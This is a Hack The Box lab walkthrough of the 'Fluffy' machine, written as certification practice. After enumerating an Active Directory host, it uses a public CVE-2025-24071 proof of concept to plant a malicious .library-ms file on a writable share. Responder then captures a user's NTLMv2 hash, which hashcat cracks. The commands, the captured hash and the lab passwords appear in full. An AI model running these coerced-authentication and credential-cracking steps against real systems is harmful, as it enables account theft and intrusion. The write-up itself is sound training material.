---
layout: post
title:  "Fluffy"
date:   2025-12-29 6:30:00 +0000
categories: walkthroughs
---
# Introduction
Fluffy is an easy HTB Labs machine and is also the first box in the CPTS Preparation Track. The box takes place in an assumed breach scenario where we are given the credentials of an Active Directory domain user. This walkthrough will focus on tackling the box as preparation for the CPTS exam, and so will go more in depth behind the thought process and tooling.

# user.txt
Start by setting an enviornment variable `IP` to the target's public IP. This approach avoids repeatedly typing or copy-pasting the IP address, reduces the risk of accidentally targeting the wrong host, and makes it easy to automatically censor the IP in reports.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ export IP=10.129.232.88
```

We begin by scanning all TCP ports using Nmap to identify open services. The `-sC` flag runs Nmap’s default scripts, which perform safe and commonly useful checks against any discovered services. The `-sV` flag enables service and version detection, allowing us to identify the software and specific versions running on each open port.

To speed up the scan, the `-T4` timing template can be used to increase the rate at which Nmap sends probes (`-T3` is the default). Alternatively, the `--min-rate` option can be used to enforce a minimum probe rate. In lab environments such as Hack The Box, I have found `-T4` to be reasonably reliable and unlikely to miss open ports. However, for an exam setting or a real-world engagement, I would generally avoid using `-T4` or `--min-rate` unless I was confident the network and target could handle the increased scan speed. The `-oA` flag can be used to save the scan results in multiple output formats, making the data easier to reference later or incorporate into reports.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ nmap -sC -sV -p- $IP -T4
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-22 18:14 +0000
Nmap scan report for 10.129.232.88
Host is up (0.034s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-23 01:17:11Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-12-23T01:18:40+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-12-23T01:18:41+00:00; +6h59m55s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-12-23T01:18:40+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-12-23T01:18:41+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m54s, deviation: 0s, median: 6h59m54s
| smb2-time: 
|   date: 2025-12-23T01:18:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 244.48 seconds
```

The Nmap scan revealed the FQDN of the target (DC01.fluffy.htb) and the domain (fluffy.htb). We can add both the FQDN and domain to our /etc/hosts so our tools will be able to resolve them. Ensure that dc01.fluffy.htb is the first entry on the target IP line in /etc/hosts (before fluffy.htb). This is important because in Linux, the first entry for an IP is used as the hostname to for authentication like validating TLS certificates or building Keberos SPNs.
```
10.129.232.88   dc01.fluffy.htb fluffy.htb
```

The Nmap scan results also found some interesting protocols/services that we can enumerate.
1. DNS
2. Kerberos
3. SMB
4. RPC
5. LDAP
6. WINRM

#### DNS
We query the DNS server for any records related to the fluffy.htb zone.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ dig any fluffy.htb @$IP 

; <<>> DiG 9.20.15-2-Debian <<>> any fluffy.htb @10.129.232.88
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 6574
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;fluffy.htb.                    IN      ANY

;; ANSWER SECTION:
fluffy.htb.             600     IN      A       10.129.232.82
fluffy.htb.             3600    IN      NS      dc01.fluffy.htb.
fluffy.htb.             3600    IN      SOA     dc01.fluffy.htb. hostmaster.fluffy.htb. 143 900 600 86400 3600
fluffy.htb.             600     IN      AAAA    dead:beef::46b4:5be6:480e:113d

;; ADDITIONAL SECTION:
dc01.fluffy.htb.        3600    IN      A       10.129.232.88
dc01.fluffy.htb.        3600    IN      AAAA    dead:beef::391d:3003:3b3:7ef3

;; Query time: 35 msec
;; SERVER: 10.129.232.88#53(10.129.232.88) (TCP)
;; WHEN: Mon Dec 22 18:23:42 UTC 2025
;; MSG SIZE  rcvd: 193
```
We only find the uninteresting hostmaster.fluffy.htb, which is the standard contact used in DNS SOA records.

We can attempt a zone transfer on fluffy.htb.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ dig axfr fluffy.htb @$IP

; <<>> DiG 9.20.15-2-Debian <<>> axfr fluffy.htb @10.129.232.88
;; global options: +cmd
; Transfer failed.
```
The zone transfer failed, likely because it is not allowed.

#### SMB/RPC
I like to enumerate SMB and RPC early because these services often expose low-hanging fruit such as user lists, password policies, group memberships, and accessible file shares. The enum4linux-ng tool is well suited for this stage, as it automates a variety of SMB and RPC based queries, including enumerating domain users and determining a user’s level of access to SMB shares.

For this box, we use the provided credentials to enumerate as the user j.fleischman. If credentials were not available, we could also attempt both anonymous and guest authentication to check for any misconfigurations or leftover permissions that allow unauthenticated enumeration.

We use the `-A` flag to run all default enumeration modules, which provides a broad overview of the target’s domain information, users, groups, shares, and security settings in a single command.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ enum4linux-ng -A $IP -u 'j.fleischman' -p 'J0elTHEM4n1990!'
ENUM4LINUX - next generation (v1.3.7)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.232.88
[*] Username ......... 'j.fleischman'
[*] Random Username .. 'sjxytoks'
[*] Password ......... 'J0elTHEM4n1990!'
[*] Timeout .......... 5 second(s)

<SNIP>
```

From the enum4linux-ng scan results, we find a list of domain users.
```bash
 ======================================
|    Users via RPC on 10.129.232.88    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 9 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 9 user(s) via 'enumdomusers'
[+] After merging user results we have 9 user(s) total:
'1103':
  username: ca_svc
  name: certificate authority service
  acb: '0x00000210'
  description: (null)
'1104':
  username: ldap_svc
  name: ldap service
  acb: '0x00000210'
  description: (null)
'1601':
  username: p.agila
  name: Prometheus Agila
  acb: '0x00000210'
  description: (null)
'1603':
  username: winrm_svc
  name: winrm service
  acb: '0x00000210'
  description: (null)
'1605':
  username: j.coffey
  name: John Coffey
  acb: '0x00000210'
  description: (null)
'1606':
  username: j.fleischman
  name: Joel Fleischman
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000214'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00020011'
  description: Key Distribution Center Service Account
```
We could also have retrieved this list by manually performing the RPC query using the tool rpcclient.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ rpcclient -U 'j.fleischman' --password 'J0elTHEM4n1990!' $IP   
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ca_svc] rid:[0x44f]
user:[ldap_svc] rid:[0x450]
user:[p.agila] rid:[0x641]
user:[winrm_svc] rid:[0x643]
user:[j.coffey] rid:[0x645]
user:[j.fleischman] rid:[0x646]
```

The enum4linux-ng scan also returns the password policy in the domain. The password policy requires that passwords must be at least 7 characters long. There are no password property bits enabled, meaning there is not complexity requirement. We should keep this in mind if in the future, we are creating a new domain user or force changing the password of another user in the domain. We also see that the password policy has no lockout threshold, meaning we can likely brute force credentials against the domain controller without locking out the accounts.
```bash
 ==========================================
|    Policies via RPC for 10.129.232.88    |
 ==========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Minimum password age: 1 day 4 minutes
  Maximum password age: 41 days 23 hours 53 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 10 minutes
  Lockout duration: 10 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set
```
We could also have retrieved this list by manually performing the RPC query using the tool rpcclient.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ rpcclient -U 'j.fleischman' --password 'J0elTHEM4n1990!' $IP
rpcclient $> getdompwinfo
min_password_length: 7
password_properties: 0x00000000
```

The enum4linux-ng scan also returns the accessible SMB shares to j.fleischman.
```bash
 =======================================
|    Shares via RPC on 10.129.232.88    |
 =======================================
[*] Enumerating shares
[+] Found 6 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
IT:
  comment: ''
  type: Disk
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share IT
[+] Mapping: OK, Listing: OK
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK
```
We could also have used NetExec, smbclient, or smbclient.py to retrieve this information. Below is an example using NetExec.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ nxc smb $IP -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares     
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                               
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
```
The NetExec scan result also shows that j.fleischman has WRITE permissions to the `IT` share. This is interesting because being able to write files to a SMB share enables the possibility of coerced authentication attacks. The `IT` share is also interesting because it is a non-standard share.

We can recursively search for files in the IT share by using the smbmap tool and specifying the depth of how many directories deep we want smbmap to scan.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ smbmap -H $IP -u 'j.fleischman' -p 'J0elTHEM4n1990!' -r 'IT' --depth 10
<SNIP>

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[+] IP: 10.129.232.88:445       Name: dc01.fluffy.htb           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ, WRITE
        ./IT
        dr--r--r--                0 Tue Dec 23 02:05:22 2025    .
        dr--r--r--                0 Tue Dec 23 02:05:22 2025    ..
        dr--r--r--                0 Fri May 16 14:51:49 2025    Everything-1.4.1.1026.x64
        fr--r--r--          1827464 Fri May 16 14:51:49 2025    Everything-1.4.1.1026.x64.zip
        dr--r--r--                0 Fri May 16 14:51:49 2025    KeePass-2.58
        fr--r--r--          3225346 Fri May 16 14:51:49 2025    KeePass-2.58.zip
        fr--r--r--           169963 Sat May 17 14:31:07 2025    Upgrade_Notice.pdf
        ./IT//Everything-1.4.1.1026.x64
        dr--r--r--                0 Fri May 16 14:51:49 2025    .
        dr--r--r--                0 Fri May 16 14:51:49 2025    ..
        fr--r--r--          2265104 Fri May 16 14:51:49 2025    everything.exe
        fr--r--r--           958342 Fri May 16 14:51:49 2025    Everything.lng
        ./IT//KeePass-2.58
        dr--r--r--                0 Fri May 16 14:51:49 2025    .
        dr--r--r--                0 Fri May 16 14:51:49 2025    ..
        fr--r--r--           768478 Fri May 16 14:51:49 2025    KeePass.chm
        fr--r--r--          3305824 Fri May 16 14:51:49 2025    KeePass.exe
        fr--r--r--              763 Fri May 16 14:51:49 2025    KeePass.exe.config
        fr--r--r--           463264 Fri May 16 14:51:49 2025    KeePass.XmlSerializers.dll
        fr--r--r--           609136 Fri May 16 14:51:49 2025    KeePassLibC32.dll
        fr--r--r--           785776 Fri May 16 14:51:49 2025    KeePassLibC64.dll
        dr--r--r--                0 Fri May 16 14:51:49 2025    Languages
        fr--r--r--            18710 Fri May 16 14:51:49 2025    License.txt
        dr--r--r--                0 Fri May 16 14:51:49 2025    Plugins
        fr--r--r--            97128 Fri May 16 14:51:49 2025    ShInstUtil.exe
        dr--r--r--                0 Fri May 16 14:51:49 2025    XSL
        ./IT//KeePass-2.58/XSL
        dr--r--r--                0 Fri May 16 14:51:49 2025    .
        dr--r--r--                0 Fri May 16 14:51:49 2025    ..
        fr--r--r--             2732 Fri May 16 14:51:49 2025    KDBX_Common.xsl
        fr--r--r--             3556 Fri May 16 14:51:49 2025    KDBX_DetailsFull_HTML.xsl
        fr--r--r--             3098 Fri May 16 14:51:49 2025    KDBX_DetailsLight_HTML.xsl
        fr--r--r--              919 Fri May 16 14:51:49 2025    KDBX_PasswordsOnly_TXT.xsl
        fr--r--r--             3100 Fri May 16 14:51:49 2025    KDBX_Tabular_HTML.xsl
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```
The Everything and KeePass files seem to indicate that the box might be using the two applications. There is also an `Upgrade_Notice.pdf` file that is interesting. We can download all the files from the `IT` share using smbclient.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ smbclient -U fluffy.htb\\j.fleischman //$IP/IT
Password for [FLUFFY.HTB\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (2373.2 KiloBytes/sec) (average 2373.2 KiloBytes/sec)
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip (2382.6 KiloBytes/sec) (average 2379.2 KiloBytes/sec)
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (982.1 KiloBytes/sec) (average 2273.9 KiloBytes/sec)
getting file \Everything-1.4.1.1026.x64\everything.exe of size 2265104 as Everything-1.4.1.1026.x64/everything.exe (2536.7 KiloBytes/sec) (average 2347.5 KiloBytes/sec)
getting file \Everything-1.4.1.1026.x64\Everything.lng of size 958342 as Everything-1.4.1.1026.x64/Everything.lng (1962.0 KiloBytes/sec) (average 2296.3 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.chm of size 768478 as KeePass-2.58/KeePass.chm (1778.4 KiloBytes/sec) (average 2241.8 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.exe of size 3305824 as KeePass-2.58/KeePass.exe (2633.2 KiloBytes/sec) (average 2333.4 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.exe.config of size 763 as KeePass-2.58/KeePass.exe.config (6.1 KiloBytes/sec) (average 2280.5 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.XmlSerializers.dll of size 463264 as KeePass-2.58/KeePass.XmlSerializers.dll (1760.3 KiloBytes/sec) (average 2256.7 KiloBytes/sec)
getting file \KeePass-2.58\KeePassLibC32.dll of size 609136 as KeePass-2.58/KeePassLibC32.dll (1989.5 KiloBytes/sec) (average 2243.2 KiloBytes/sec)
getting file \KeePass-2.58\KeePassLibC64.dll of size 785776 as KeePass-2.58/KeePassLibC64.dll (2237.2 KiloBytes/sec) (average 2242.8 KiloBytes/sec)
getting file \KeePass-2.58\License.txt of size 18710 as KeePass-2.58/License.txt (142.7 KiloBytes/sec) (average 2200.8 KiloBytes/sec)
getting file \KeePass-2.58\ShInstUtil.exe of size 97128 as KeePass-2.58/ShInstUtil.exe (654.1 KiloBytes/sec) (average 2166.4 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_Common.xsl of size 2732 as KeePass-2.58/XSL/KDBX_Common.xsl (16.9 KiloBytes/sec) (average 2115.7 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_DetailsFull_HTML.xsl of size 3556 as KeePass-2.58/XSL/KDBX_DetailsFull_HTML.xsl (24.3 KiloBytes/sec) (average 2071.9 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_DetailsLight_HTML.xsl of size 3098 as KeePass-2.58/XSL/KDBX_DetailsLight_HTML.xsl (19.5 KiloBytes/sec) (average 2026.4 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_PasswordsOnly_TXT.xsl of size 919 as KeePass-2.58/XSL/KDBX_PasswordsOnly_TXT.xsl (6.5 KiloBytes/sec) (average 1987.0 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_Tabular_HTML.xsl of size 3100 as KeePass-2.58/XSL/KDBX_Tabular_HTML.xsl (25.2 KiloBytes/sec) (average 1954.6 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[~/htb/fluffy]
└─$ ls -latr
total 5124
drwxrwxr-x 57 kali kali    4096 Dec 22 18:13 ..
-rw-r--r--  1 kali kali 1827464 Dec 22 19:07 Everything-1.4.1.1026.x64.zip
-rw-r--r--  1 kali kali 3225346 Dec 22 19:07 KeePass-2.58.zip
drwxrwxr-x  4 kali kali    4096 Dec 22 19:07 .
-rw-r--r--  1 kali kali  169963 Dec 22 19:07 Upgrade_Notice.pdf
drwxrwxr-x  2 kali kali    4096 Dec 22 19:07 Everything-1.4.1.1026.x64
drwxrwxr-x  5 kali kali    4096 Dec 22 19:07 KeePass-2.58
```

Opening `Upgrade_Notice.pdf`, we see a list of CVEs that are scheduled to be fixed. We will google for information on the CVEs that have a Medium or higher severity.
![Upgrade_notice.pdf](/assets/images/fluffy_pdf.png)

CVE-2025-24996
External control of file name or path in Windows NTLM allows an unauthorized attacker to perform spoofing over a network.
https://nvd.nist.gov/vuln/detail/CVE-2025-24996

CVE-2025-24071
Exposure of sensitive information to an unauthorized actor in Windows File Explorer allows an unauthorized attacker to perform spoofing over a network.
https://nvd.nist.gov/vuln/detail/CVE-2025-24071

CVE-2025-46785
Buffer over-read in some Zoom Workplace Apps for Windows may allow an authenticated user to conduct a denial of service via network access.
https://nvd.nist.gov/vuln/detail/cve-2025-46785

CVE-2025-29968
Improper input validation in Active Directory Certificate Services (AD CS) allows an authorized attacker to deny service over a network.
https://nvd.nist.gov/vuln/detail/cve-2025-29968

CVE-2025-21193
Active Directory Federation Server Spoofing Vulnerability
https://nvd.nist.gov/vuln/detail/cve-2025-21193

Based on our research of the CVEs, it appears that the box might be vulnerable to some form of coerced authentication since multiple CVEs are related to spoofing attacks. Starting with the critical CVEs, we found some PoCs for CVE-2025-24071 that we could try out.

The ![PoC](https://github.com/ThemeHackers/CVE-2025-24071.git) I ended up using was by ThemeHackers. I always check the repository and exploit scripts to make sure it isn't malware. The script seems to be generating a malicious .library-ms file that points to a remote UNC path based on the IP the script takes in. We can specify the input IP as our attack box's IP so that the authentication attempt goes to our attack box. We can then catch the authentication attempt and read the Net-NTLMv2 hash that was used for authentication. To run the exploit, I used uv to manage the script dependencies in a python virtual environment. This will ensure that I won't have package incompatibilities and keeps all my python script environments separate.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ git clone https://github.com/ThemeHackers/CVE-2025-24071.git                 
Cloning into 'CVE-2025-24071'...
remote: Enumerating objects: 14, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 14 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (14/14), 8.81 KiB | 8.81 MiB/s, done.
Resolving deltas: 100% (1/1), done.

┌──(kali㉿kali)-[~/htb/fluffy]
└─$ cd CVE-2025-24071          

┌──(kali㉿kali)-[~/htb/fluffy/CVE-2025-24071]
└─$ uv add --script exploit.py -r requirements.txt              
Updated `exploit.py`

┌──(kali㉿kali)-[~/htb/fluffy/CVE-2025-24071]
└─$ uv run exploit.py -i 10.10.15.126 -f cve-2025-24071
Installed 1 package in 8ms

<SNIP>
Creating exploit with filename: cve-2025-24071.library-ms
Target IP: 10.10.15.126

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.

┌──(kali㉿kali)-[~/htb/fluffy/CVE-2025-24071]
└─$ ls -latr
total 36
drwxrwxr-x 5 kali kali 4096 Dec 22 19:34 ..
-rw-rw-r-- 1 kali kali    8 Dec 22 19:34 requirements.txt
-rw-rw-r-- 1 kali kali 3732 Dec 22 19:34 README.md
-rw-rw-r-- 1 kali kali 1070 Dec 22 19:34 LICENSE
drwxrwxr-x 7 kali kali 4096 Dec 22 19:34 .git
-rw-rw-r-- 1 kali kali 7396 Dec 22 19:35 exploit.py
-rw-rw-r-- 1 kali kali  337 Dec 22 19:36 exploit.zip
drwxrwxr-x 3 kali kali 4096 Dec 22 19:36 .
```

The exploit generates a file called exploit.zip that contains the malicious cve-2025-24071.library-ms file. We can upload this file to the `IT` SMB share because j.fleischman has WRITE privileges over that share. Before uploading the file, we should start Responder on our attack box to listen for SMB authentication attempts.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.126]
    Responder IPv6             [dead:beef:2::117c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-PJ1LQTKHAI2]
    Responder Domain Name      [3WFR.LOCAL]
    Responder DCE-RPC Port     [47609]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...
```

With Responder running, we use smbmap to upload exploit.zip.
```bash
┌──(kali㉿kali)-[~/htb/fluffy/CVE-2025-24071]
└─$ smbmap -H $IP -u 'j.fleischman' -p 'J0elTHEM4n1990!' --upload exploit.zip "IT\exploit.zip"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)
[+] Starting upload: exploit.zip (337 bytes)
[+] Upload complete..
[*] Closed 1 connections
```

After about a minute, our Responder gets an authentication attempt with the Net-NTLMv2 hash of p.agila.
```bash
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:c4c7fe8d00db2581:7C312353CF713C856F333AF6DA838101:0101000000000000802C10A47A73DC01CD0B62C0390E4B190000000002000800330057004600520001001E00570049004E002D0050004A0031004C00510054004B00480041004900320004003400570049004E002D0050004A0031004C00510054004B0048004100490032002E0033005700460052002E004C004F00430041004C000300140033005700460052002E004C004F00430041004C000500140033005700460052002E004C004F00430041004C0007000800802C10A47A73DC01060004000200000008003000300000000000000001000000002000005E7DC0EA00E3B77E702F8A8A0D2EFDB036DE913A186F48EF059AAD0E95B8278A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100320036000000000000000000                                                      
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
```

We can crack the hash with hashcat. In this case, Net-NTLMv2 hashes have a unique format, meaning hashcat can figure out the hash type on its own. We could also specify `-m 5600` to tell hashcat the hash type.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ hashcat hash /usr/share/wordlists/rockyou.txt   
hashcat (v7.1.2) starting in autodetect mode

<SNIP>

5600 | NetNTLMv2 | Network Protocol

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

P.AGILA::FLUFFY:c4c7fe8d00db2581:7c312353cf713c856f333af6da838101:0101000000000000802c10a47a73dc01cd0b62c0390e4b190000000002000800330057004600520001001e00570049004e002d0050004a0031004c00510054004b00480041004900320004003400570049004e002d0050004a0031004c00510054004b0048004100490032002e0033005700460052002e004c004f00430041004c000300140033005700460052002e004c004f00430041004c000500140033005700460052002e004c004f00430041004c0007000800802c10a47a73dc01060004000200000008003000300000000000000001000000002000005e7dc0ea00e3b77e702f8a8a0d2efdb036de913a186f48ef059aad0e95b8278a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100320036000000000000000000:prometheusx-303
                                                          
Session..........: hashcat
Status...........: Cracked
